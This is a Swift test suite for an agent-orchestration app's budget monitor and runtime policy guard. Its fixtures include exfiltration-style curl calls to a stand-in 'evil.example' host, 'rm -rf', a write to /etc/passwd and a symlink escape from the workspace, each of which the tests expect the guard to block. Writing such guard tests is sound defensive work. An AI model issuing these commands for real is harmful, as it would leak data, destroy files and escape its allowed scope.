import Testing
import Foundation
@testable import ASTRA
import ASTRACore

@Suite("Claude permission policy")
@MainActor
struct ClaudePermissionPolicyTests {

    @Test("Autonomous policy produces skip-permissions flag")
    func autonomousPolicyFlags() {
        let worker = AgentRuntimeWorker()
        worker.permissionPolicy = .autonomous
        #expect(worker.permissionPolicy.cliArguments == ["--dangerously-skip-permissions"])
    }

    @Test("Restricted policy produces no CLI flags")
    func restrictedPolicyFlags() {
        let worker = AgentRuntimeWorker()
        worker.permissionPolicy = .restricted
        #expect(worker.permissionPolicy.cliArguments.isEmpty)
    }

    @Test("Interactive policy produces no CLI flags")
    func interactivePolicyFlags() {
        let worker = AgentRuntimeWorker()
        worker.permissionPolicy = .interactive
        #expect(worker.permissionPolicy.cliArguments.isEmpty)
    }

    @Test("Workers default to restricted permissions")
    func workerDefaultsRestricted() {
        let worker = AgentRuntimeWorker()
        #expect(worker.skipPermissions == false)
        #expect(worker.permissionPolicy == .restricted)
    }
}

@Suite("ProcessMonitor — Budget, Repetition, and Idle Timeout")
struct ProcessMonitorTests {

    // MARK: - Budget Enforcement

    @Test("Budget exceeded via estimated tokens")
    func budgetExceededEstimated() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: 100)

        // 500 chars of text ≈ 125 estimated tokens, exceeds budget of 100
        let event = ParsedEvent.text(text: String(repeating: "x", count: 500))
        let shouldKill = monitor.processEvent(event, process: nil)

        #expect(shouldKill == true)
        #expect(monitor.budgetExceeded == true)
        #expect(monitor.estimatedTokens == 125)
    }

    @Test("Warning budget mode does not kill on estimated overage")
    func warningBudgetModeDoesNotKillEstimatedOverage() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: 100,
            budgetEnforcementMode: .warning
        )

        let event = ParsedEvent.text(text: String(repeating: "x", count: 500))
        let shouldKill = monitor.processEvent(event, process: nil)

        #expect(shouldKill == false)
        #expect(monitor.budgetExceeded == false)
        #expect(monitor.budgetWarning == true)
        #expect(monitor.estimatedTokens == 125)
    }

    @Test("Warning budget mode does not kill on reported overage")
    func warningBudgetModeDoesNotKillReportedOverage() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: 1000,
            budgetEnforcementMode: .warning
        )

        let event = ParsedEvent.result(
            text: "done",
            costUSD: 0.01,
            totalInputTokens: 800,
            totalOutputTokens: 300,
            durationMs: 5000,
            numTurns: 1,
            isError: false
        )
        let shouldKill = monitor.processEvent(event, process: nil)

        #expect(shouldKill == false)
        #expect(monitor.budgetExceeded == false)
        #expect(monitor.budgetWarning == true)
    }

    @Test("Budget not exceeded when under limit")
    func budgetNotExceeded() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: 10000)

        let event = ParsedEvent.text(text: "Hello world")
        let shouldKill = monitor.processEvent(event, process: nil)

        #expect(shouldKill == false)
        #expect(monitor.budgetExceeded == false)
    }

    @Test("Budget exceeded via result event exact count")
    func budgetExceededFromResult() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: 1000)

        let event = ParsedEvent.result(
            text: "done",
            costUSD: 0.01,
            totalInputTokens: 800,
            totalOutputTokens: 300,
            durationMs: 5000,
            numTurns: 1,
            isError: false
        )
        let shouldKill = monitor.processEvent(event, process: nil)

        #expect(shouldKill == true)
        #expect(monitor.budgetExceeded == true)
    }

    @Test("Budget exceeded via stream usage event")
    func budgetExceededFromStreamUsage() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: 1000)

        let shouldKill = monitor.processEvent(
            .usage(totalInputTokens: 900, totalOutputTokens: 200),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.budgetExceeded == true)
    }

    @Test("Warning budget mode does not kill on stream usage overage")
    func warningBudgetModeDoesNotKillStreamUsageOverage() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: 1000,
            budgetEnforcementMode: .warning
        )

        let shouldKill = monitor.processEvent(
            .usage(totalInputTokens: 900, totalOutputTokens: 200),
            process: nil
        )

        #expect(shouldKill == false)
        #expect(monitor.budgetExceeded == false)
        #expect(monitor.budgetWarning == true)
    }

    @Test("Final result budget overage after astra complete is warning only")
    func finalBudgetOverageAfterAstraCompleteDoesNotKill() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: 1000)

        let complete = ParsedEvent.astraProtocol(.valid(.complete(
            summary: "Updated the slide.",
            verifiedBy: "Snapshot confirmed"
        )))
        let completeKill = monitor.processEvent(complete, process: nil)

        let result = ParsedEvent.result(
            text: "done",
            costUSD: 0.01,
            totalInputTokens: 2_000,
            totalOutputTokens: 100,
            durationMs: 5000,
            numTurns: 4,
            isError: false
        )
        let resultKill = monitor.processEvent(result, process: nil)

        #expect(completeKill == false)
        #expect(resultKill == false)
        #expect(monitor.budgetExceeded == false)
        #expect(monitor.finalReportedBudgetExceededAfterCompletion == true)
    }

    @Test("Errored final result after astra complete still exceeds budget")
    func erroredFinalBudgetOverageAfterAstraCompleteStillKills() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: 1000)
        let _ = monitor.processEvent(.astraProtocol(.valid(.complete(
            summary: "Done",
            verifiedBy: nil
        ))), process: nil)

        let result = ParsedEvent.result(
            text: "provider failed",
            costUSD: 0.01,
            totalInputTokens: 2_000,
            totalOutputTokens: 100,
            durationMs: 5000,
            numTurns: 4,
            isError: true
        )
        let shouldKill = monitor.processEvent(result, process: nil)

        #expect(shouldKill == true)
        #expect(monitor.budgetExceeded == true)
        #expect(monitor.finalReportedBudgetExceededAfterCompletion == false)
    }

    @Test("Unlimited budget never exceeds")
    func unlimitedBudget() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max)

        // Massive text with varying content to avoid repetition breaker
        for i in 0..<100 {
            let _ = monitor.processEvent(.text(text: "chunk \(i) " + String(repeating: "x", count: 10000)), process: nil)
        }

        #expect(monitor.budgetExceeded == false)
    }

    @Test("Tool use and tool result add to token estimate")
    func toolTokenEstimation() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: 10000)

        let _ = monitor.processEvent(.toolUse(name: "Read", id: "t1", input: nil), process: nil)
        #expect(monitor.estimatedTokens == 100)

        let _ = monitor.processEvent(.toolResult(toolId: "t1", content: ""), process: nil)
        #expect(monitor.estimatedTokens == 300)
    }

    @Test("Team events add to token estimate")
    func teamTokenEstimation() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: 10000)

        let _ = monitor.processEvent(.teammateStarted(taskId: "t1", name: "agent", prompt: "do stuff"), process: nil)
        #expect(monitor.estimatedTokens == 50)

        let _ = monitor.processEvent(.teamMessage(from: "lead", to: "agent", content: "check this"), process: nil)
        #expect(monitor.estimatedTokens == 100) // 50 + max(50, 10/4)
    }

    @Test("Astra protocol events do not affect budget or repetition")
    func astraProtocolEventsAreAdvisory() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: 1, maxRepetitions: 1)
        let event = ParsedEvent.astraProtocol(.valid(.complete(summary: "Done", verifiedBy: "swift test")))

        let shouldKill = monitor.processEvent(event, process: nil)

        #expect(shouldKill == false)
        #expect(monitor.estimatedTokens == 0)
        #expect(monitor.budgetExceeded == false)
        #expect(monitor.repetitionKilled == false)
    }

    // MARK: - Repetition Circuit Breaker

    @Test("Repetition kills after max identical events")
    func repetitionKill() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max, maxRepetitions: 3)

        let event = ParsedEvent.toolUse(name: "Read", id: "t1", input: nil)
        let _ = monitor.processEvent(event, process: nil) // 1
        #expect(monitor.repetitionKilled == false)

        let _ = monitor.processEvent(event, process: nil) // 2
        #expect(monitor.repetitionKilled == false)

        let shouldKill = monitor.processEvent(event, process: nil) // 3 — triggers
        #expect(shouldKill == true)
        #expect(monitor.repetitionKilled == true)
        #expect(monitor.budgetExceeded == true) // repetition sets budgetExceeded too
    }

    @Test("Different events reset repetition counter")
    func repetitionResets() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max, maxRepetitions: 3)

        let _ = monitor.processEvent(.toolUse(name: "Read", id: "t1", input: nil), process: nil)
        let _ = monitor.processEvent(.toolUse(name: "Read", id: "t1", input: nil), process: nil)
        // Different event resets counter
        let _ = monitor.processEvent(.text(text: "hello"), process: nil)
        let _ = monitor.processEvent(.toolUse(name: "Read", id: "t1", input: nil), process: nil)
        let shouldKill = monitor.processEvent(.toolUse(name: "Read", id: "t1", input: nil), process: nil)

        #expect(shouldKill == false) // only 2 in a row, not 3
        #expect(monitor.repetitionKilled == false)
    }

    @Test("Default max repetitions is 8")
    func defaultMaxRepetitions() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max)
        let event = ParsedEvent.toolUse(name: "Glob", id: "t1", input: nil)

        for i in 1...7 {
            let _ = monitor.processEvent(event, process: nil)
            #expect(monitor.repetitionKilled == false, "Should not kill at repetition \(i)")
        }

        let shouldKill = monitor.processEvent(event, process: nil) // 8th
        #expect(shouldKill == true)
        #expect(monitor.repetitionKilled == true)
    }

    // MARK: - Event Signatures

    @Test("Event signatures are distinct per type")
    func eventSignatures() {
        let sigs = [
            AgentRuntimeWorker.ProcessMonitor.eventSignature(.text(text: "hello")),
            AgentRuntimeWorker.ProcessMonitor.eventSignature(.thinking(text: "hello")),
            AgentRuntimeWorker.ProcessMonitor.eventSignature(.toolUse(name: "Read", id: "t1", input: nil)),
            AgentRuntimeWorker.ProcessMonitor.eventSignature(.toolResult(toolId: "t1", content: "")),
            AgentRuntimeWorker.ProcessMonitor.eventSignature(.systemInit(model: "sonnet", sessionId: "s1")),
            AgentRuntimeWorker.ProcessMonitor.eventSignature(.result(text: nil, costUSD: nil, totalInputTokens: 0, totalOutputTokens: 0, durationMs: nil, numTurns: nil, isError: false)),
            AgentRuntimeWorker.ProcessMonitor.eventSignature(.astraProtocol(.invalid(reason: "bad marker"))),
        ]
        // All signatures should be unique
        #expect(Set(sigs).count == sigs.count)
    }

    @Test("Text signatures truncate at 80 chars")
    func signatureTruncation() {
        let longText = String(repeating: "a", count: 200)
        let sig = AgentRuntimeWorker.ProcessMonitor.eventSignature(.text(text: longText))
        #expect(sig.count <= 85) // "text:" prefix + 80 chars
    }

    // MARK: - ProcessResult

    @Test("ProcessResult defaults")
    func processResultDefaults() {
        let result = AgentRuntimeWorker.ProcessResult(exitCode: 0)
        #expect(result.exitCode == 0)
        #expect(result.error == nil)
        #expect(result.budgetExceeded == false)
        #expect(result.timedOut == false)
        #expect(result.repetitionKilled == false)
    }

    @Test("ProcessResult with all flags")
    func processResultFlags() {
        let result = AgentRuntimeWorker.ProcessResult(
            exitCode: 137,
            error: "killed",
            budgetExceeded: true,
            timedOut: false,
            repetitionKilled: true
        )
        #expect(result.exitCode == 137)
        #expect(result.budgetExceeded == true)
        #expect(result.repetitionKilled == true)
        #expect(result.timedOut == false)
    }

    // MARK: - Resume Budget Calculation

    @Test("Resume budget is remaining tokens")
    func resumeBudgetCalculation() {
        // Simulate: budget 10000, already used 7000 → remaining 3000
        let totalBudget = 10000
        let used = 7000
        let remaining = max(1000, totalBudget - used)
        #expect(remaining == 3000)

        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: remaining)
        // 12004 chars / 4 = 3001 estimated tokens → exceeds budget of 3000
        let event = ParsedEvent.text(text: String(repeating: "x", count: 12004))
        let shouldKill = monitor.processEvent(event, process: nil)
        #expect(shouldKill == true)
    }

    @Test("Resume with almost exhausted budget gets minimum 1000")
    func resumeMinimumBudget() {
        let totalBudget = 10000
        let used = 9800
        let remaining = max(1000, totalBudget - used)
        #expect(remaining == 1000) // Floor of 1000

        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: remaining)
        // Small text should not exceed 1000
        let shouldKill = monitor.processEvent(.text(text: "hello"), process: nil)
        #expect(shouldKill == false)
    }

    @Test("Resume with unlimited budget stays unlimited")
    func resumeUnlimitedBudget() {
        let totalBudget = 0 // 0 means unlimited
        let remaining: Int
        if totalBudget == 0 {
            remaining = Int.max
        } else {
            remaining = max(1000, totalBudget)
        }
        #expect(remaining == Int.max)
    }

    // MARK: - Turn Counting

    @Test("Turn count increments on result events")
    func turnCountIncrementsOnResult() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max, maxTurns: 10)

        let result = ParsedEvent.result(
            text: "done",
            costUSD: 0.001,
            totalInputTokens: 50,
            totalOutputTokens: 50,
            durationMs: 100,
            numTurns: 1,
            isError: false
        )
        let _ = monitor.processEvent(result, process: nil)
        #expect(monitor.turnCount == 1)
    }

    @Test("Non-result events do not increment turn count")
    func nonResultEventsNoTurnIncrement() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max, maxTurns: 10)

        let _ = monitor.processEvent(.text(text: "hello"), process: nil)
        let _ = monitor.processEvent(.toolUse(name: "Read", id: "t1", input: nil), process: nil)
        let _ = monitor.processEvent(.toolResult(toolId: "t1", content: ""), process: nil)
        let _ = monitor.processEvent(.thinking(text: "hmm"), process: nil)

        #expect(monitor.turnCount == 0)
    }

    @Test("Max turns exceeded kills process")
    func maxTurnsExceeded() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max, maxTurns: 3)

        let result = ParsedEvent.result(
            text: "done",
            costUSD: 0.001,
            totalInputTokens: 50,
            totalOutputTokens: 50,
            durationMs: 100,
            numTurns: 1,
            isError: false
        )

        let _ = monitor.processEvent(result, process: nil) // turn 1
        #expect(monitor.maxTurnsExceeded == false)
        let _ = monitor.processEvent(result, process: nil) // turn 2
        #expect(monitor.maxTurnsExceeded == false)
        let shouldKill = monitor.processEvent(result, process: nil) // turn 3
        #expect(shouldKill == true)
        #expect(monitor.maxTurnsExceeded == true)
    }

    @Test("Unlimited turns (0) never exceeds")
    func unlimitedTurns() {
        let monitor = AgentRuntimeWorker.ProcessMonitor(tokenBudget: Int.max, maxTurns: 0)

        for i in 0..<50 {
            let result = ParsedEvent.result(
                text: "done \(i)",
                costUSD: 0.001,
                totalInputTokens: 10,
                totalOutputTokens: 10,
                durationMs: 100,
                numTurns: 1,
                isError: false
            )
            let _ = monitor.processEvent(result, process: nil)
        }
        #expect(monitor.maxTurnsExceeded == false)
        #expect(monitor.turnCount == 50)
    }

    @Test("ProcessResult maxTurnsExceeded flag")
    func processResultMaxTurnsFlag() {
        let result = AgentRuntimeWorker.ProcessResult(
            exitCode: 137,
            error: "max turns",
            budgetExceeded: false,
            timedOut: false,
            repetitionKilled: false,
            maxTurnsExceeded: true
        )
        #expect(result.maxTurnsExceeded == true)
        #expect(result.budgetExceeded == false)
    }
}

@Suite("Runtime Policy Guard")
struct RuntimePolicyGuardTests {
    @Test("Observed tools outside manifest allow-list stop the provider")
    func unauthorizedToolStopsProvider() {
        let manifest = runtimePolicyManifest(allowedTools: ["Read", "Glob", "Grep"])
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "Bash", id: "t1", input: ["command": "git status"]),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyViolation == true)
        #expect(monitor.policyViolationMessage?.contains("not in the provider allow-list") == true)
    }

    @Test("Ask-first tool pauses for runtime approval")
    func askFirstToolPausesForRuntimeApproval() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["Read", "Glob", "Grep"],
            askFirstTools: ["Bash"]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "Bash", id: "t1", input: ["command": "curl https://redcap.stanford.edu/api/"]),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyApprovalRequired == true)
        #expect(monitor.policyApprovalMessage?.contains("Permission requested for tool: Bash") == true)
        #expect(monitor.policyApprovalMessage?.contains("Runtime grant: Bash(curl:*)") == true)
        #expect(monitor.policyViolation == false)
    }

    @Test("Approved shell grant satisfies ask-first tool")
    func approvedShellGrantSatisfiesAskFirstTool() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["Read", "Glob", "Grep", "Bash(curl:*)"],
            askFirstTools: ["Bash"]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "Bash", id: "t1", input: ["command": "curl https://redcap.stanford.edu/api/"]),
            process: nil
        )

        #expect(shouldKill == false)
        #expect(monitor.policyApprovalRequired == false)
        #expect(monitor.policyViolation == false)
    }

    @Test("Denied shell pattern wins over ask-first tool")
    func deniedShellPatternWinsOverAskFirstTool() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["Read", "Glob", "Grep"],
            askFirstTools: ["Bash"],
            deniedShellPatterns: ["rm:*"]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "Bash", id: "t1", input: ["command": "rm -rf build"]),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyApprovalRequired == false)
        #expect(monitor.policyViolation == true)
    }

    @Test("Denied shell command pattern stops the provider")
    func deniedShellPatternStopsProvider() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["Bash"],
            allowedShellPatterns: ["git:*", "swift:*"],
            deniedShellPatterns: ["rm:*"]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "Bash", id: "t1", input: ["command": "rm -rf build"]),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyViolation == true)
        #expect(monitor.policyViolationMessage?.contains("denied command pattern") == true)
    }

    @Test("Allowed shell command pattern continues")
    func allowedShellPatternContinues() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["Bash"],
            allowedShellPatterns: ["git:*", "swift:*"],
            deniedShellPatterns: ["rm:*"]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "Bash", id: "t1", input: ["command": "git status --short"]),
            process: nil
        )

        #expect(shouldKill == false)
        #expect(monitor.policyViolation == false)
    }

    @Test("Mutating file outside allowed paths stops the provider")
    func outsidePathMutationStopsProvider() {
        let manifest = runtimePolicyManifest(allowedTools: ["Write"])
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "Write", id: "t1", input: ["file_path": "/etc/passwd"]),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyViolation == true)
        #expect(monitor.policyViolationMessage?.contains("outside the workspace paths") == true)
    }

    @Test("Read outside allowed paths stops the provider when path is observable")
    func outsidePathReadStopsProvider() {
        let manifest = runtimePolicyManifest(allowedTools: ["Read"])
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "Read", id: "t1", input: ["file_path": "/private/tmp/outside.txt"]),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyViolation == true)
    }

    @Test("Mutating tool without observable path stops the provider")
    func mutationWithoutPathStopsProvider() {
        let manifest = runtimePolicyManifest(allowedTools: ["Write"])
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "Write", id: "t1", input: [:]),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyViolation == true)
        #expect(monitor.policyViolationMessage?.contains("could not validate the file path") == true)
    }

    @Test("Network destination outside allow-list stops the provider")
    func networkOutsideAllowListStopsProvider() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["WebFetch"],
            allowedURLPatterns: ["https://allowed.example/*"]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "WebFetch", id: "t1", input: ["url": "https://evil.example/data"]),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyViolation == true)
        #expect(monitor.policyViolationMessage?.contains("outside the URL allow-list") == true)
    }

    @Test("Every URL in shell network commands must satisfy the allow-list")
    func shellCommandWithSecondURLOutsideAllowListStopsProvider() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["Bash"],
            allowedURLPatterns: ["https://allowed.example/*"]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(
                name: "Bash",
                id: "t1",
                input: [
                    "command": "curl https://allowed.example/status && curl https://evil.example/exfil"
                ]
            ),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyViolation == true)
        #expect(monitor.policyViolationMessage?.contains("outside the URL allow-list") == true)
    }

    @Test("Specific URL deny patterns stop the provider")
    func specificURLDenyPatternStopsProvider() {
        let manifest = runtimePolicyManifest(
            allowedTools: ["Bash"],
            deniedURLPatterns: ["https://evil.example/*"]
        )
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(
                name: "Bash",
                id: "t1",
                input: ["command": "curl https://evil.example/data"]
            ),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyViolation == true)
        #expect(monitor.policyViolationMessage?.contains("denied URL pattern") == true)
    }

    @Test("Symlinked paths escaping workspace stop the provider")
    func symlinkPathEscapeStopsProvider() throws {
        let root = FileManager.default.temporaryDirectory
            .appendingPathComponent("astra-policy-root-\(UUID().uuidString)", isDirectory: true)
        let outside = FileManager.default.temporaryDirectory
            .appendingPathComponent("astra-policy-outside-\(UUID().uuidString)", isDirectory: true)
        let link = root.appendingPathComponent("linked-outside", isDirectory: true)
        let secret = link.appendingPathComponent("secret.txt")
        defer {
            try? FileManager.default.removeItem(at: root)
            try? FileManager.default.removeItem(at: outside)
        }
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        try FileManager.default.createDirectory(at: outside, withIntermediateDirectories: true)
        try Data("secret".utf8).write(to: outside.appendingPathComponent("secret.txt"))
        try FileManager.default.createSymbolicLink(at: link, withDestinationURL: outside)

        let manifest = runtimePolicyManifest(allowedTools: ["Read"], workspacePath: root.path)
        let monitor = AgentRuntimeWorker.ProcessMonitor(
            tokenBudget: Int.max,
            taskID: manifest.taskID,
            policyGuard: AgentRuntimePolicyGuard(manifest: manifest)
        )

        let shouldKill = monitor.processEvent(
            .toolUse(name: "Read", id: "t1", input: ["file_path": secret.path]),
            process: nil
        )

        #expect(shouldKill == true)
        #expect(monitor.policyViolation == true)
    }
}

private func runtimePolicyManifest(
    allowedTools: [String],
    askFirstTools: [String] = [],
    deniedTools: [String] = [],
    allowedShellPatterns: [String] = [],
    askFirstShellPatterns: [String] = [],
    deniedShellPatterns: [String] = [],
    allowedURLPatterns: [String] = [],
    deniedURLPatterns: [String] = [],
    workspacePath: String = "/tmp/astra-policy-guard"
) -> RunPermissionManifest {
    let render = ProviderPolicyRender(
        providerID: .claudeCode,
        adapterVersion: 1,
        policyLevel: .review,
        configOwnership: .generated,
        permissionMode: PermissionPolicy.restricted.rawValue,
        allowedTools: allowedTools,
        askFirstTools: askFirstTools,
        deniedTools: deniedTools,
        allowedShellPatterns: allowedShellPatterns,
        askFirstShellPatterns: askFirstShellPatterns,
        deniedShellPatterns: deniedShellPatterns,
        allowedURLPatterns: allowedURLPatterns,
        deniedURLPatterns: deniedURLPatterns,
        cliArgumentsSummary: [],
        settingsSummary: "test",
        generatedConfigPreview: "",
        enforcementTiers: [.providerNative, .astraBrokered],
        diagnostics: [],
        usesBroadProviderPermissions: false
    )
    let taskID = UUID()
    return RunPermissionManifest(
        taskID: taskID,
        runID: UUID(),
        phase: "test",
        providerID: .claudeCode,
        providerVersion: nil,
        model: "test",
        policyLevel: .review,
        policyScope: .taskOverride,
        providerRender: render,
        workspacePath: workspacePath,
        additionalPaths: [],
        environmentKeyNames: [],
        credentialLabels: [],
        approvalsGranted: []
    )
}

@Suite("Budget Enforcement Preferences")
struct BudgetEnforcementPreferenceTests {
    @Test("Configured enforcement defaults to warning and reads overrides")
    func configuredDefaultReadsStoredMode() {
        let suiteName = "astra-budget-enforcement-\(UUID().uuidString)"
        let defaults = UserDefaults(suiteName: suiteName)!
        defer { defaults.removePersistentDomain(forName: suiteName) }

        #expect(BudgetEnforcementMode.configuredDefault(in: defaults) == .warning)

        defaults.set(BudgetEnforcementMode.warning.rawValue, forKey: AppStorageKeys.budgetEnforcementMode)
        #expect(BudgetEnforcementMode.configuredDefault(in: defaults) == .warning)

        defaults.set(BudgetEnforcementMode.hardStop.rawValue, forKey: AppStorageKeys.budgetEnforcementMode)
        #expect(BudgetEnforcementMode.configuredDefault(in: defaults) == .hardStop)

        defaults.set("unexpected", forKey: AppStorageKeys.budgetEnforcementMode)
        #expect(BudgetEnforcementMode.configuredDefault(in: defaults) == .warning)
    }
}

@Suite("Runtime Budget Profiles")
struct RuntimeBudgetProfileTests {
    @Test("Every provider has a budget profile")
    func everyProviderHasBudgetProfile() {
        for runtime in AgentRuntimeID.allCases {
            let profile = AgentRuntimeBudgetProfile.profile(for: runtime)
            #expect(profile.runtime == runtime)
            #expect(profile.launchOverheadTokens >= 0)
        }
    }

    @Test("Launch estimates are provider specific")
    func launchEstimatesAreProviderSpecific() {
        let prompt = String(repeating: "x", count: 400)
        let promptEstimate = AgentProcessMonitor.estimatedTokenCount(for: prompt)

        let claude = AgentRuntimeBudgetProfile.profile(for: .claudeCode)
        let copilot = AgentRuntimeBudgetProfile.profile(for: .copilotCLI)

        #expect(claude.estimatedLaunchInputTokens(prompt: prompt) == promptEstimate + claude.launchOverheadTokens)
        #expect(copilot.estimatedLaunchInputTokens(prompt: prompt) == promptEstimate + copilot.launchOverheadTokens)
        #expect(claude.launchOverheadTokens > copilot.launchOverheadTokens)
    }
}
